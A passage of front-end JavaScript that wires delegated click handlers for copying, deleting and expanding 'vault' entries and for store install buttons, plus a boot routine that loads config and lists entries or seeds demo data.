    // delegated clicks for vault items and store install buttons
    document.addEventListener('click', function (ev) {
      var actBtn = ev.target.closest('[data-act]');
      if (actBtn && actBtn.closest('.vault-item')) {
        var vid = actBtn.closest('.vault-item').dataset.id;
        if (actBtn.dataset.act === 'copy') copyVaultEntry(vid);
        else if (actBtn.dataset.act === 'delete') deleteVaultEntry(vid);
        return;
      }
      var head = ev.target.closest('.vault-item-head');
      if (head && !ev.target.closest('[data-act]')) {
        head.parentNode.classList.toggle('open');
        return;
      }
      var inst = ev.target.closest('[data-install]');
      if (inst) installStoreItem(inst.dataset.install);
    });
  }

  function boot() {
    loadConfig();
    initUI();
    startSplash();
    if (DEMO) {
      demoSeed();
    } else if (hasBridge) {
      call('vaultList').then(function (d) { vaultEntries = d.entries || []; renderVaults(); }).catch(function () {});
    }
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
  else boot();
})();
